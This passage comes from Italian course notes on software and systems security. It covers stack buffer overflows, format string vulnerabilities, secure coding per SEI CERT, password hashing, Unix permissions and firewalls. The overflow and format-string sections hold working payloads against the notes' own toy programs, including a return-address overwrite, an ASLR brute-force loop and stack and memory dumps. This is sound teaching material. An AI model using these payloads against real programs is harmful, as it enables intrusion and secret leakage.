   0x0000000000400bb2 <+11>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000400bb6 <+15>:    mov    eax,0x0
   0x0000000000400bbb <+20>:    call   0x400b4d <checkpassword>   # invoca checkpassword
   0x0000000000400bc0 <+25>:    test   eax,eax
   0x0000000000400bc2 <+27>:    je     0x400bd8 <main+49>
   0x0000000000400bc4 <+29>:    mov    edi,0x49241e
   0x0000000000400bc9 <+34>:    call   0x410500 <puts>     #stampa in output
   0x0000000000400bce <+39>:    mov    edi,0x0
   0x0000000000400bd3 <+44>:    call   0x40eab0 <exit>
   0x0000000000400bd8 <+49>:    mov    edi,0x49242d
   0x0000000000400bdd <+54>:    call   0x410500 <puts>     #stampa in output
   0x0000000000400be2 <+59>:    mov    edi,0x1
   0x0000000000400be7 <+64>:    call   0x40eab0 <exit>
```

Andando ad ispezionare i parametri passati alla funzione `puts` (cioè `edi`) possiamo capire dove vogliamo ritornare infatti:

il parametro della prima `puts`:

```bash
(gdb) x/s 0x49241e
0x49241e:       "Authenticated!"
```

mentre il parametro dell’altra funzione `puts`:

```bash
(gdb) x/s 0x49242d
0x49242d:       "Wrong password!"
```

vogliamo quindi saltare alla prima `puts` e quindi all’istruzione con indirizzo

`0x0000000000400bc4 <+29>`

Eseguendo il programma con questo input otteniamo ciò che vogliamo:

```bash
echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\xc4\x0b\x40\x00\x00\x00\x00\x00" | ./stack-pwd
Insert password: Authenticated!
```

Vengono usate 24 ‘A’ per sovrascrivere i 16 byte del buffer e gli 8 byte per il vecchio base pointer, i rimanente 8 byte vengono sovrascritti con il nuovo indirizzo (in *little endian*)

### Caso 2

Se compiliamo disabilitando solo lo **stack protector.**

`gcc stack-pwd.c -o stack-pwd-pie -fno-stack-protector`

In questo caso gli indirizzi vengono randomizzati ad ogni esecuzione, tranne gli ultimi 3 caratteri esadecimali (quindi un byte e mezzo, 12 bit) che sono un offset fisso.

Se facciamo un disassemly del main otteniamo:

```bash
(gdb) disass main
 ...
 0x000000000000085c <+20>:    call   0x7ea <checkpassword>
 0x0000000000000861 <+25>:    test   eax,eax               #ritorno previsto
 0x0000000000000863 <+27>:    je     0x87b <main+51>
 0x0000000000000865 <+29>:    lea    rdi,[rip+0xd2]        #ritorno che vogliamo
 0x000000000000086c <+36>:    call   0x670 <puts@plt>
 ...
```

Abbiamo quindi i primi 13 caratteri randomizzati mentre gli ultimi 3 sono fissi.

Per riuscire nell’attacco dovremmo quindi sovrascrivere gli ultimi due byte con l’offset che interessa a noi, ad esempio `0x65 0x08` e ripetere l’attacco fino a che randomicamente l’indirizzo non termina con `00 08 65`

Dove `00` è il carattere di fine stringa sul nostro input, `08` è il byte che abbiamo sovrascritto (di cui solo `8` fa parte dell’offset) e `65` è l’altro byte che abbiamo sovrascritto che fa parte interamente dell’offset.

Dato che `865` è l’offset fisso devo ripetere l’attacco finché davanti all’offset non appare in modo randomico `000`.

uno script bash per tentare l’attacco è il seguente:

```bash
i=1; while true; do echo -e "AAAAAAAAAAAAAAAAAAAAAAAA\x65\x08" | ./stack-pwd-pie  | grep Auth; echo $i; i=$((i+1)); done | grep -B 1 Auth
```

## Altre tecniche di attacco

- Un **shellcode** è un pezzo di codice macchina (solitamente in linguaggio assembly) che un attaccante inserisce nello stack. Una volta che lo stack viene sovrascritto, l'attaccante modifica il puntatore di ritorno per eseguire il proprio shellcode. In genere, questo codice apre una "shell" che consente il controllo remoto della macchina compromessa.
- **Return to syscall / libc**: In questa tecnica, piuttosto che iniettare il codice direttamente (come uno shellcode), l'attaccante sfrutta funzioni di sistema esistenti, come quelle della *libc* (la libreria C standard), che sono già caricate in memoria. Ad esempio, l'attaccante può sovrascrivere lo stack in modo che l'esecuzione del programma "ritorni" a una funzione di sistema critica, come `system()`, che esegue comandi di sistema.
- Il **Return Oriented Programming (ROP)** permette di concatenare una serie di istruzioni assembly (chiamate gadget) già presenti nel binario stesso o nelle librerie di sistema (come *libc*) al fine di eseguire del codice a piacere. L'idea è simile all’attacco precedente, ma con ROP si possono combinare vari gadget per creare un comportamento complesso senza la necessità di iniettare nuovo codice.

## Difese

Si possono adottare delle difese contro lo stack overflow, in particolare difese a tempo di compilazione e a run-time.

### Difese a tempo di compilazione

Il metodo è quello di scrivere programmi più resistenti a questo tipo di attacco:

- **Utilizzo di linguaggi sicuri**: è consigliato utilizzare linguaggi di programmazione sicuri che gestiscono automaticamente le dimensioni dei buffer e le eccezioni, limitando l'uso di linguaggi non sicuri solo quando strettamente necessario (es. per l'accesso diretto all'hardware o per performance estreme).
- **Tecniche di codifica sicura**: verificare sempre i limiti dei buffer e utilizzare funzioni di libreria sicure.
- **Protezione dello stack**: il compilatore può aggiungere codice aggiuntivo per monitorare la corruzione dello stack. Una tecnica comune è l'uso di un **canary**, un valore casuale inserito dopo il vecchio base pointer di un frame.
    - **Canary**: quando una funzione inizia, un valore casuale (canary) viene copiato nello stack. Prima che la funzione ritorni, il canary viene confrontato con il valore originale e, se non corrisponde, il programma abortisce. Questa tecnica è molto efficace nel prevenire overflow dello stack, ma è vulnerabile se il valore del canary viene trapelato o se un attaccante può accedere direttamente allo stack.

### Difese a run-time

- **Non-eXecutable address space (NX)**: questa difesa impedisce l'esecuzione di codice in segmenti di memoria specifici (come stack o heap), richiedendo il supporto hardware. Blocca l'esecuzione di **shellcode**, ma non impedisce attacchi come **return to syscall**, **libc** o **ROP**. Alcuni programmi disabilitano NX se necessitano di eseguire codice sullo stack.
- **Address Space Layout Randomization (ASLR)**: l'ASLR randomizza la disposizione della memoria del programma, rendendo più difficile per un attaccante conoscere gli indirizzi esatti a cui fare return dopo uno stack overflow. Tuttavia, può essere aggirata con tecniche di brute-force o se gli indirizzi di memoria vengono rivelati

# format strings

Una format string è una stringa che contiene delle direttive di formato. Ad esempio in C le direttiva sono `%d`, `%s`, che vengono utilizzate in funzioni come `printf()` .

Ad esempio con l’istruzione `printf("Result: %d\n", my_var)` quello che succede è:

- **Parsing a runtime**: La funzione `printf` analizza la stringa `"Result: %d\n"` carattere per carattere a runtime per trovare caratteri di formattazione (come `%d`).
- **Sostituzione di valori**: Quando trova un segnaposto (`%d` in questo caso), `printf` cerca i valori corrispondenti nella lista degli argomenti forniti (come `my_var`) e li sostituisce nella stringa.
- **Output finale**: La stringa risultante viene quindi costruita e inviata allo standard output.

### Interpretazione a runtime

Queste direttive sono all’interno di un **parametro** per la funzione `printf` ed vengono **interpretate** a *runtime*, questo permette **l’accesso arbitrario allo stack** quando viene interpretata una string format (se quest’ultima viene controllata da un attaccante).

Nella seguente istruzione `printf(s);` se `s` contiene delle direttive di formato queste verranno interpretate:

```c
char *s = "valore: %d";
printf(s, 10);    // => valore: 10
```

### Argomenti alle funzioni

Le *format string* contengono un **numero arbitrario di direttive**, di conseguenza anche le funzioni che usano le *format string* accettano un numero arbitrario di argomenti.

Vediamo come può funzionare questa cosa:

1. la format string viene parsata
2. la i-esima direttiva viene mappata all’i-esimo argomento della funzione

In linguaggio assembly la *format string* viene salvata registro `rdi`, mentre gli argomenti successivi saranno salvati in `rsi, rdx, rcx, r8, r9` e se ce ne sono altri verranno pushati nello stack.

Ad esempio con l’istruzione `printf("%s%s%s%s%s%s","H","e","l","l","o"," World\n");` subito dopo l’invocazione alla funzione `printf`, la memoria sarà in questo stato:

![https://i.ibb.co/VCvPwGm/image.png](https://i.ibb.co/VCvPwGm/image.png)

Nota come il settimo argomento viene salvato nello stack.

### Sbagliare il numero di argomenti

Siccome la *format string* viene interpretata a runtime, se si sbaglia il numero di argomenti (mettendone troppi o troppo pochi) non si avranno errori, ma solo un *warning* (se la format string è una variabile allora non c’è nemmeno il *warning)*.

Nel caso di un numero eccessivo di argomenti, quelli in più vengono ignorati. Mentre con un numero di argomenti minore di quello richiesto, la funzione tenterà di dereferenziare i registri (o la zona nello stack) corrispondenti agli argomenti mancanti e se è un indirizzo dereferenziato valido allora lo stampa altrimenti va in *segmentation fault.*

## Vulnerabilità

Se un attaccante ha il controllo di una format string, ad esempio `s1` può riuscire a dumpare il contenuto dello stack e di alcuni registri usando delle direttive.

- `printf(s1)` VULNERABLE (warning a tempo di compilazione)
- `printf("%s",s1)` OK
- `printf(s1,s2)` VULNERABLE (nessun warning a tempo di compilazione)

### Esempio di codice vulnerabile

```c
#include <stdio.h>
int main() {
	 char buffer[128];
	 printf("What is your name? ");
	 fflush(stdout);
	 
	 // reads at most 128 bytes from standard input, including NULL
	 fgets(buffer, sizeof(buffer), stdin);
	 
	 // format string vulnerability: the user controls buffer!
	 // should be printf("Hello %s",buffer) so that the format string
	 // is not controlled by the user.
	 printf("Hello ");
	 printf(buffer);
}
```

Se diamo come input al programma 8 volte la direttiva `“.%16lx”` (che indica numeri in formato esadecimale lunghi 16 caratteri aggiungendo zeri a sinistra se necessario) otteniamo questo:

![https://i.ibb.co/XFggvHV/image.png](https://i.ibb.co/XFggvHV/image.png)

Quando arriviamo a stampare i valori dello stack stiamo stampando il contenuto del `buffer`:

Se facciamo partire il buffer con 8 byte di ‘A’, dopo aver stampato i registri contenenti valori casuali, arriviamo a stampare il contenuto buffer (che ovviamente è salvato nello stack) come si nota dai caratteri `0x41 = A`, poi stampa anche il resto della stringa raggruppata per 8 byte.

![https://i.ibb.co/ZzDjLq9/image.png](https://i.ibb.co/ZzDjLq9/image.png)

## Esercizio

Possiamo ottenere il valore del PIN dumpandolo dallo stack nel seguente codice?

```c
#include <stdio.h>
int main() {
	 char buffer[128];
	 char PIN[128] = "1337"; // secret PIN
	 
	 printf("What is your name? ");
	 fflush(stdout);
	 
	 // reads at most 128 bytes from standard input, including NULL!
	 fgets(buffer,sizeof(buffer),stdin);
	 
	 printf("Hello ");
	 // format string vulnerability: the attacker controls buffer
	 printf(buffer);
}
```

Supponiamo che il PIN venga allocato immediatamente dopo il buffer.

se riuscissimo a inserire abbastanza “`%016lx`” nel buffer in modo da leggere il contenuto dei registri e successivamente dello stack fino al raggiungimento del PIN ce l’avremmo fatta:

- il buffer è grande 128 byte, in tale buffer devo metterci le “`%016lx`”
- Il contenuto del buffer è nel sesto parametro, cioè quando si inizia a leggere lo stack
- Il primo registro conterrà l’input con le direttive, quindi per raggiungere il PIN abbiamo bisogno di consumare i successivi 5 registri per poi leggere 8 byte 16 volte (per consumare il buffer) e infine leggere altri 8 byte per il PIN:
    
    5 + 16 + 1 = 22. Abbiamo quindi bisogno di 22 “`%016lx`” per raggiungere la prima word del PIN
    
- dato che la stringa “`%016lx`” è lunga 6 byte, la stringa totale sarà lunga 22*6 = 132 byte che è maggiore dei 128 byte che il nostro buffer ci permette di inserire

Quindi non riusciamo a raggiungere la stringa.

### Soluzione 1

Al posto di usare “`%016lx`” usiamo “`%lx`”, dato che la nuova stringa è lunga 3 byte la stringa totale sarà lunga 22*3 = 66 byte che ci sta dentro il buffer.

Eseguendo l’attacco otteniamo:

```c
python3 -c 'print(".%lx"*22)' | ./vulnerable
What is your name? Hello .6c6c6548.0.206f6c6c.0.7fffe46682b0.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.786c252e786c252e.a.0.0.0.0.37333331
```

Gli ultimi byte (`37333331`) sono la password: la possiamo convertire da esadecimale a testo ASCII (`7331`) e poi siccome la rappresentazione è in *little endian* dobbiamo invertire l’ordine dei caratteri (`1337`)

### Soluzione 2

Nelle format string si può specificare il parametro da utilizzare con la seguente sintassi:

`%6$016lx`, dove con `6$` indichiamo **l’indice dell’argomento** da utilizzare (che parte da `0`), in questo caso vogliamo che questa direttiva utilizzi il settimo argomento (`6$`)  passato alla `printf`, cioè il primo parametro che sta nello stack.

```c
printf("%6$d", 1, 2, 3, 4, 5, 6);  //=> 6
```

Se usiamo, nella direttiva, l’argomento con indice 22 otteniamo il PIN

```bash
python3 -c 'print("%22$16lx")' | ./vulnerable
What is your name? Hello 37333331
```

## Accesso a locazioni arbitrarie

Quando il buffer è salvato nello stack è possibile dumpare ogni locazione in memoria, l’idea è la seguente:

1. **Identificare la posizione del buffer nello stack**
2. **Iniettare l'indirizzo target nel buffer** in modo che corrisponda a un argomento specifico di `printf`, ad esempio l'argomento `a`.
3. **Estrarre il contenuto della memoria** utilizzando la direttiva **`%a$s`** per dereferenziare l'indirizzo target e stamparne il contenuto come stringa.

### Step 1

Identificare la posizione del buffer sullo stack:

Si inizia la stringa di input con `%a$16lx.AAAAAAAA` e si prova con diversi valori di `a` finché non si trova l'output `4141414141414141`.

- Questo indica che l'argomento `a` corrisponde alla posizione del buffer sullo stack.
- Ad esempio, se con `a=7`, vediamo per la prima volta l’output `4141414141414141` significa che il buffer inizia all’argomento che passiamo alla funzione con indice 6 (il quale conterrà `%a$16lx.`) e nella successiva cella dello stack, ad indice 7, invece abbiamo i secondi 8 byte del buffer contenenti `AAAAAAAA`.

Notare che `%a$16lx.` occupa esattamente 8 byte, quindi prende una intera cella dello stack.

### Step 2

Iniettare l'Indirizzo target:

Quello che possiamo fare è rimpiazzare le `AAAAAAAA` con un indirizzo target (in formato little endian)

Ad esempio, se l'indirizzo target è `0x6b90f0`, la stringa di input sarà `%7$16lx.\xf0\x90\x6b\x00\x00\x00\x00\x00`

### Step 3

Estrarre il contenuto della memoria:

Rimpiazzando `%7$16lx.` con `%7$s....`  possiamo stampare il contenuto all’indirizzo di memoria iniettato come stringa. 

Nota: i `....` servono per mantenere la lunghezza di 8 byte

Quindi con la seguente stringa in input otteniamo il contenuto di un indirizzo di memoria arbitrario

`%7$s....\xf0\x90\x6b\x00\x00\x00\x00\x00`

## Prevenzione agli attacchi

i compilatori moderni lanciano degli warning quando `printf` viene invocato senza argomenti di formato, nonostante ciò ci sono casi in cui non vengono lanciati warning ad esempio facendo `printf(f, s)`, se l’attaccante controllasse `f` riuscirebbe a fare l’attacco.

È quindi importante che la *format string* sia sempre una costante definita dal programmatore e non dovrebbe essere influenzata dall'input dell'utente.


# Secure coding

Linguaggi di programmazione come C sono ritenuti ***unsafe*** e richiedono che ci sia una grossa attenzione da parte degli sviluppatori per scrivere codice sicuro. Nonostante questo, tutti i linguaggi presentano comportamenti insicuri.

## Analisi

Sebbene l'ispezione manuale del codice sia possibile per programmi di piccole dimensioni, gli **strumenti di analisi statica** sono necessari per applicazioni del mondo reale. Tuttavia, le proprietà che dipendono dal flusso di controllo sono generalmente indecidibili, quindi gli strumenti di analisi statica non possono essere precisi al 100%.

Durante una analisi si possono presentare:

- **falsi negativi**: non vengono segnalati errori effettivamente presenti nel codice.
- **falsi positivi**: vengono segnalati errori che in realtà non esistono.

Generalmente si desidera un'analisi **sana** (nessun falso negativo) e **completa** (nessun falso positivo), ma nella pratica gli strumenti danno più priorità ad essere **sani** cercando di minimizzare i falsi positivi.

## Taint analysis

Un concetto chiave nella sicurezza del codice è **l'analisi della contaminazione (*taint analysis*)**, che determina quali valori provenienti dagli input del programma possono influenzare i valori utilizzati in un'operazione rischiosa.

- **La sorgente contaminata** (*Tainted Source*): Si riferisce a qualsiasi fonte di dati esterni al programma che potrebbe essere controllata da un utente malintenzionato.
- **Il valore contaminato** (*Tainted Value*): Un valore è considerato contaminato se deriva da una sorgente contaminata e non è stato opportunamente sanificato.
- ***Restricted Sink*:** Si riferisce a un argomento di una funzione che richiede un insieme specifico di valori accettabili. Utilizzare un valore contaminato in un restricted sink può portare a vulnerabilità di sicurezza.

### Propagazione

Una contaminazione si può propagare attraverso le operazioni del programma.

Se un'operazione utilizza un dato contaminato, il risultato dell'operazione sarà a sua volta contaminato. Un banale esempio è copiare una stringa contaminata in un'altra stringa tramite funzioni come `strcpy`.

Esempio di propagazione:

![https://i.ibb.co/S3CwCyc/image.png](https://i.ibb.co/S3CwCyc/image.png)

## Sanitizzazione

La sanitizzazione è il processo per **rimuovere la contaminazione** da un valore.

Esistono due approcci principali:

- **Sostituzione:** I valori contaminati (fuori dal dominio del *sink*) vengono sostituiti con valori appartenenti al dominio *sink*.
- **Terminazione:** Il programma rileva un valore contaminato e termina l'esecuzione o salta il codice che utilizza quel valore.

## Secure Coding: SEI CERT

Il [SEI CERT C Coding Standard](https://wiki.sei.cmu.edu/confluence/display/c/SEI+CERT+C+Coding+Standard) fornisce regole e raccomandazioni per la scrittura di codice C sicuro.

Esso definisce:

- **Regole**: Requisiti normativi la cui violazione indica un bug potenzialmente sfruttabile.
- **Raccomandazioni**: Suggerimenti per migliorare sicurezza, affidabilità e robustezza del codice.

### Valutazione del Rischio

La valutazione del rischio aiuta a dare priorità alle correzioni delle violazioni delle regole e raccomandazioni. 

Si valuta la **gravità** delle conseguenze, la **probabilità** di sfruttamento e il **costo** della correzione. Le violazioni **più critiche e meno costose** hanno **più priorità**.

**Livelli di gravità**:

1. Bassa: ad esempio Denial of Service, terminazione anomala.
2. Media: ad esempio Violazione dell'integrità dei dati, divulgazione di informazioni.
3. Alta: ad esempio esecuzione di codice arbitrario.

**Livelli di probabilità**:

1. Improbabile
2. Probabile
3. Verosimile

**Livelli di costo di correzione**:

1. Alto: Correzione manuale e rilevamento manuale.
2. Medio: Correzione manuale e rilevamento automatico.
3. Basso: Correzione automatica e rilevamento automatico.

I valori di questi livelli vengono moltiplicati tra loro producendo i possibili valori di **priorità**:  `1, 2, 3, 4, 6, 8, 9, 12, 18, 27`

| Livello | Priorità | Interpretazione |
| --- | --- | --- |
| L1 | 12, 18, 27 | alta gravità, alta probabilità, basso costo di correzione |
| L2 | 6, 8, 9 | media gravità, probabilità media, costo medio |
| L3 | 1, 2, 3, 4 | bassa gravità, bassa probabilità, alto costo |

### Esempio

Una **regola** che ci da [SEI CERT C Coding Standard](https://wiki.sei.cmu.edu/confluence/display/c/SEI+CERT+C+Coding+Standard) è quella di **non passare una sequenza di caratteri non terminata da NULL a una funzione di libreria che si aspetta una stringa.**

```c
#include <stdio.h>
int main() {
	 char c_str[3] = "abc";
	 printf("%s\n", c_str );
}
```

Nel codice l’array `c_str` non ha abbastanza spazio per inserire il carattere di terminazione stringa.

Per fixare questo problema possiamo seguire una **raccomandazione**: non specificare la grandezza dell’array di caratteri quando viene inizializzato con un letterale.

```c
#include <stdio.h>
int main() {
	 char c_str[] = "abc";
	 printf("%s\n", c_str);
}
```

In questo modo `c_str` si alloca in automatico lo spazio necessario per contenere il letterale e il carattere di terminazione.

Un attaccante può sfruttare questa vulnerabilità per accedere alla memoria fuori dai limiti dell’array (buffer overflow), la community categorizza questa regola in questo modo

| Gravità | Probabilità | costo di correzione | Priorità | Livello |
| --- | --- | --- | --- | --- |
| Alta | Probabile | medio | 12 | L1 |


# Identificazione

Passiamo ora a discutere della sicurezza nell'**identificazione di un utente** in un sistema informatico o una rete.

L’identificazione o autenticazione di un utente o in generale di una entità è un processo fondamentale per la regolazione dell’**accesso ad una risorsa**.

Un tipico esempio è l’autenticazione tramite username e password, in cui il sistema chiede di fornire un username e una password, il sistema controllerà le credenziali fornite con quelle già in suo possesso per validare l’autenticazione.

Un buono schema di autenticazione serve ad **impedire** che una entità si **impersonifichi** per qualcun’altra.

## Classi di schemi di identificazione

Vediamo delle categorie che raggruppano gli schemi di identificazione, tali schemi si possono basare su:

- un segreto che si **conosce**: password, passphrase, PIN, chiavi crittografiche
- un oggetto che si **possiede**: Carta di credito, smartphone
- una **caratteristica** biometrica che si **possiede**: firma cartacea, impronta digitale, volto e voce, retina dell’occhio

## Password

L’autenticazione tramite password presenta alcuni problemi:

1. Può essere **intercettata**.
    
    È importante usare canali cifrati, come *HTTPS*
    
2. Può essere **indovinata.**
    
    È importante usare password forti.
    
    Inoltre il sistema deve implementare un meccanismo per limitare i tentativi possibili
    
3. Può essere **salvata** nel server **in modo non sicuro.**
    
    È importante che il server non memorizzi le password in chiaro, bensì un hash di esse.
    

## Funzioni hash

Una **funzione di hash** è una funzione che calcola un valore di lunghezza fissa, chiamato *digest*, dato un input di dimensioni arbitrarie. Sebbene le **collisioni** siano possibili (cioè che input diversi generano lo stesso hash), le funzioni di hash unidirezionali rendono **computazionalmente impossibile recuperare una password dal suo hash**.

Quindi un server nel momento del login **confronta gli hash** e non le password in chiaro.

Funzioni hash molto utilizzate oggi e ritenute essere sufficientemente sicure sono le SHA-2 che producono hash da 224 bit in su.

Un comando per ottenere l’hash di una stringa di testo su Linux:

```bash
$ echo -n "mypassword" | sha256sum
89e01536ac207279409d4de1e5253e01f4a1769e696db0d6062ca9b8f56767c8 -
```

Un altro utilizzo delle funzioni hash è per controllare **l’integrità di file**.

Dai seguenti comandi si nota che la modifica del file viene rilevata confrontando gli hash dello stesso file prima e dopo la modifica:

```bash
$ echo "ciao" > file.txt
$ sha256sum file.txt > checksum

$ sha256sum -c checksum
file.txt: OK
$ echo "modifica" > file.txt
$ sha256sum -c checksum
file.txt: FAILED
sha256sum: WARNING: 1 computed checksum did NOT match
```

## Attacchi offline

Nonostante l’uso delle funzioni hash, usare password forti è comunque importante per proteggersi da **attacchi brute force offline** su cui non è possibile limitare il numero di tentativi.

Inoltre è possibile usare un attacco a **rainbow tables**, che consiste nel avere una lista di associazioni di password comuni con il rispettivo hash già calcolato, se l’attaccante riuscisse ad ottenere l’hash di una password, con una semplice ricerca nella rainbow table otterrebbe la rispettiva password (se presente).

### Salting delle password

Per contrastare quest’ultima tipologia di attacco, si utilizza il **salting delle password**, che consiste nell'aggiungere un valore casuale (il sale) a ciascuna password prima di calcolare l'hash.

**Ogni salt è diverso** per ciascun utente e viene salvato assieme all’hash nel server.

Quindi il server mantiene la password hashata con il salt, e il salt utilizzato per quella password. L’utente quando si autentica manderà la propria password che verrà hashata con il salt rispettivo e verrà confrontato il risultato con l’hash che c’è sul server.

In questo modo se l’attaccante ottiene solo l’hash della password dovrebbe indovinare il salt, ma dato che il salt è scritto assieme all’hash della password, se un attaccante ottiene anche il salt può usarlo per calcolare l’hash delle password comuni e vedere se il risultato combacia.

Per migliorare ulteriormente la sicurezza si cerca di **mantenere segreti i salt**. Inoltre si cerca di fare **computazioni dell’hash iterate più volte** (anche migliaia di volte) per aumentare il tempo di computazione necessario e quindi rallentare attacchi di brute force.

## Token-based authentication

Vediamo adesso l’autenticazione basata su **un oggetto che si possiede.**

Un esempio è una **carta con una piccola memoria** la suo interno (Carte bancomat a Banda Magnetica), La banda magnetica contiene dati statici codificati, come il numero del conto e altre informazioni di base. Spesso si accoppia l’oggetto ad un PIN, in modo che un attaccante abbia bisogno di entrambi. Il problema di queste carte è che sono facili da clonare con dei lettori, e magari l’uso di una telecamera per vedere il pin inserito dal proprietario.

Le **smart card**, dotate di un chip integrato, offrono maggiore sicurezza rispetto alle tradizionali memory card passive. I chip generano un codice unico a ogni transazione, rendendo praticamente impossibile clonare la carta. Può fare anche operazioni crittografiche.

## Biometric authentication

Infine, la **biometria** utilizza le caratteristiche biologiche uniche degli utenti per l'identificazione. Questo processo prevede la registrazione delle caratteristiche biometriche in un database e il successivo confronto con le caratteristiche acquisite durante la verifica.

Sebbene la biometria offra un alto livello di sicurezza, solleva anche preoccupazioni relative alla privacy, poiché la compromissione di un database biometrico avrebbe un impatto significativo: sono dati unici e non cambiabili

# Controllo degli accessi

Con controllo degli accessi si intende una pratica di sicurezza per impedire l’accesso a delle risorse a chi non è autorizzato.

Nell’ambito dei sistemi operativi, chi può accedere alle risorse solitamente è un **utente**, un **programma**, un **processo** o **altri sistemi**. L’accesso alle risorse del sistema viene regolato da una ***security policy.***

![https://i.ibb.co/KsWbtFz/image.png](https://i.ibb.co/KsWbtFz/image.png)

## Politiche di controllo degli accessi

Vediamo i diversi **tipi di politiche di controllo degli accessi**:

- **Controllo di accesso discrezionale (DAC)**: Il proprietario della risorsa determina chi può accedere alla risorsa in base alla **identità** dell’utente
    
    Un'entità **può abilitare un'altra entità** ad accedere a una risorsa.
    
- **controllo di accesso vincolato (MAC)**: Il sistema determina l’accesso alla risorsa in base a delle **etichette di classificazione** date agli utenti e alle risorse, un utente per poter accedere alla risorsa deve possedere l’etichetta corretta
    
    Un'entità che ha l'autorizzazione ad accedere a una risorsa **non può abilitare un'altra entità** ad accedere a tale risorsa.
    
- **Controllo di accesso basato sui ruoli (RBAC)**: basato sui **ruoli** che gli utenti hanno all'interno del sistema e ogni ruolo ha i propri permessi che stabiliscono quali accessi sono consentiti.
- **Controllo di accesso basato sugli attributi (ABAC)**: basato sugli **attributi** dell'utente, sulla **risorsa** a cui si accede e sulle **condizioni ambientali** correnti. Gli attributi possono includere dati come l'età dell'utente, la posizione geografica, l'ora del giorno, o il tipo di dispositivo…

## Oggetti e soggetti

Vengono chiamati **soggetti** le entità capaci di accedere a delle risorse.

Mentre vengono chiamati **oggetti** le risorse a cui accedere.

I soggetti accedono agli oggetti attraverso dei **processi** che acquisiscono i permessi dell’utente.

## Diritti di accesso

Un soggetto può avere vari diritti di accesso su un oggetto:

- Lettura (che include la copia)
- Scrittura (che include aggiungere, modificare o rimuovere del contenuto all’interno dell’oggetto)
- Esecuzione
- Eliminazione
- Creazione

Una possibile organizzazione dei diritti di accesso che possiedono i soggetti nei confronti degli oggetti è attraverso una **matrice degli accessi**:

| Soggetto/oggetto | README.txt | /etc/shadow | Carol.pdf | /bin/bash |
| --- | --- | --- | --- | --- |
| **Alice** | Lettura, Scrittura | Lettura, Scrittura |  | Lettura, Scrittura, Esecuzione |
| **Bob** | Lettura |  | Lettura | Lettura, Esecuzione |
| **Carol** | Lettura |  | Lettura, Scrittura |  |

La matrice degli accessi si può decomporre per ottenere:

- **Access Control List** (ACL): per ogni oggetto si ottiene la lista degli utente con i rispettivi permessi (decomposizione in colonne)
- **Capabilities**: per ogni soggetto si ottengono i suoi diritti su tutti gli oggetti (decomposizione in righe)

## Unix Access Control

Unix utilizza un controllo degli accessi di tipo DAC.

Il kernel ha accesso libero a tutto il sistema, i programmi accedono a file e device attraverso il kernel.

Ad **ogni file e directory è assegnato uno** ***user identifier** (userid, uid)* che ne indica il proprietario e contribuisce a determinarne i permessi d'accesso.

Ad **ogni processo è associato un insieme di *user identifier*** che contribuiscono a determinare i permessi che il processo ha su file e directory.
L'utente root (con userid = 0) ha sempre accesso garantito dal kernel.

### Permessi su un file

In Unix i permessi su un file sono formati da **tre blocchi** che definiscono i permessi del proprietario, del gruppo e di tutti gli altri.

Ogni blocco può possedere i seguenti caratteri:

- `r`: permette la **lettura** del file o la visualizzazione del contenuto della directory.
- `w`: permette la **modifica** del file o del contenuto della directory.
- `x`: permette **l'esecuzione** del file o l'attraversamento della directory.
- `s`: indica che il file è SUID (o SGID se la "s" è nella blocco del gruppo) e permette al file di essere eseguito con i privilegi del proprietario (o del gruppo) (viene messo al posto della `x`)
    
    Usare questa funzionalità è rischioso in quanto, se il file è vulnerabile un attaccante può ottenere i privilegi di root.
    
    Se proprio necessario è opportuno usare una pratica di *privilege drop*: cioè usare subito i privilegi del proprietario e poi scendere ai permessi standard dell’utente. Una volta scesi di permessi non sarà più possibile riacquisire i permessi del proprietario (ciò si può fare in C con la funzione `setuid()`)
    
- `t`: il cosiddetto ***sticky bit***, può apparire al posto della `x` nel terzo blocco in un file di tipo directory e indica che non è possibile eliminare file all’interno di tale directory di cui non si è proprietari. Questo è particolarmente utile in cartelle condivise come `/tmp`

La seguente stringa di informazioni UNIX (ottenibili con il comando `ls -la`), mostra i permessi di una directory/file:

```bash
-rwxr-xr-- 8 username groupname 678 Jan 10:10 filename 
```

la prima parte: `-rwxr-xr--` riguarda i permessi, in particolare:

- Il primo carattere riguarda il fatto che il file è una directory (’`d`’) oppure no (‘`-`’).
- Le successive **prime tre posizioni** indicano i permessi del **proprietario**. Nell’esempio il proprietario ha i permessi di lettura, scrittura ed esecuzione (`rwx`)
- Le **seconde tre posizioni** indicano i permessi per il **gruppo**. Nell’esempio i membri del gruppo possono leggere il file eseguirlo, ma non possono scriverci (`r-x`)
- Le **ultime tre posizioni** si riferiscono ai permessi per **chiunque altro**. Nell’esempio chiunque altro può solamente leggere il file (`r--`).

### Alterare i permessi

È possibile alterare i permessi con il comando `chmod` ad esempio `chmod 760 myfile` 

Il numero `760` viene interpretato come tre cifre distinte in base ottale

- 7 = 111 = `rwx`
- 6 = 110 = `rw-`
- 0 = 000 = `---`

quindi il permesso totale sul file sarà composto come `rwxrw----`


# Firewall

In una rete possiamo avere una **host-based defence**, cioè una difesa realizzata sui singoli host, oppure una **network-based defence**, cioè un filtro implementato fuori dagli host che cerca l’intera rete.

Uno strumento usato per quest’ultimo tipo di difesa è il **Firewall**.

Si tratta di un componente hardware e/o software avente lo scopo di controllare gli accessi alle risorse di un sistema filtrando tutto il traffico che tale sistema scambia con l'esterno.

Il sistema, che si suppone sicuro, può essere un singolo computer o una rete di computer mentre l'ambiente esterno con cui interagisce è tipicamente una rete che si suppone sconosciuta e insicura (solitamente Internet).

Un firewall filtra il traffico sulla base di un insieme di **regole**, dette *policy.*

## Firewall NAT

Una funzione spesso associata al firewall è quella di NAT (*Network Address Translation*), che può contribuire a rendere inaccessibili degli host sulla rete interna mascherandone gli indirizzi IP

Le operazioni possibili che adotta il firewall in questo caso sono:

- `drop`: i pacchetti non vengono consegnati a causa di:
    - indirizzo sorgente/destinazione
    - porta sorgente/destinazione
    - contenuto del pacchetto
- `forward`: i pacchetti vengono consegnati da una sottorete ad un’altra, in base a
    - indirizzo sorgente/destinazione
    - porta sorgente/destinazione
    - contenuto del pacchetto
- `translate`: i pacchetti vengono consegnati ma gli indirizzi vengono tradotti.
    
    Questo è necessario in quanto nelle reti locali si utilizzano indirizzi privati mentre per navigare su internet si utilizzano indirizzi pubblici.
    
    Ci riferiamo a SNAT (Source NAT) per riferirci alla traduzione degli indirizzi per il traffico uscente dalla rete locale (che va verso internet)
    
